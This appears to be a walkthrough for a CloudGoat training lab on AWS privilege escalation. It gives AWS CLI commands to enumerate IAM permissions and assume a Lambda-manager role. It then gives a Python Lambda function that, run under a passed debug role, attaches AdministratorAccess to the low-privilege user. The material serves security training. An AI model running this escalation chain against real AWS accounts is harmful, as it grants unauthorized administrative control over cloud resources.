First enumerate what permissions our user has

```bash
aws sts get-caller-identity

aws configure --profile Chris

aws iam list-user-policies --user-name chris-<cloudgoat_id> --profile Chris

aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile Chris

aws iam get-policy-version --policy-arn <cg-chris-policy arn> --version-id v1 --profile Chris
```

Our user has permissions to view IAM resources as well as assuming roles.

```bash
aws iam list-roles --profile Chris

aws iam list-attached-role-policies --role-name cg-debug-role-<cloudgoat_id> --profile Chris

aws iam list-attached-role-policies --role-name cg-lambdaManager-role-<cloudgoat_id> --profile Chris

aws iam get-policy-version --policy-arn <cg-lambdaManager-policy arn> --version-id v1 --profile Chris
```

The role grants permissions manage Lambda functions & pass roles that they can use. Assuming the role grants us its permissions.

```bash
aws sts assume-role --role-arn <cg-lambdaManager-role arn> --role-session-name lambdaManager --profile Chris
```

Then add the lambdaManager credentials to your AWS CLI credentials file at `~/.aws/credentials` as shown below:

```
[lambdaManager]
aws_access_key_id = {{AccessKeyId}}
aws_secret_access_key = {{SecretAccessKey}}
aws_session_token = {{SessionToken}}
```

**Note**: The name of the file needs to be `lambda_function.py`.

````py
import boto3

def lambda_handler(event, context):
	client = boto3.client('iam')

	response = client.attach_user_policy(
		UserName = 'chris-<cloudgoat_id>',
		PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
	)

	return response
````

Create the function and invoke it to grant our user admin permissions.

```bash
zip -r lambda_function.py.zip lambda_function.py

aws lambda create-function --function-name admin_function --runtime python3.9 --role <cg-debug-role arn> --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager

aws lambda invoke --function-name admin_function out.txt --profile lambdaManager

aws iam list-attached-user-policies --user-name chris-<cloudgoat_id> --profile Chris
```
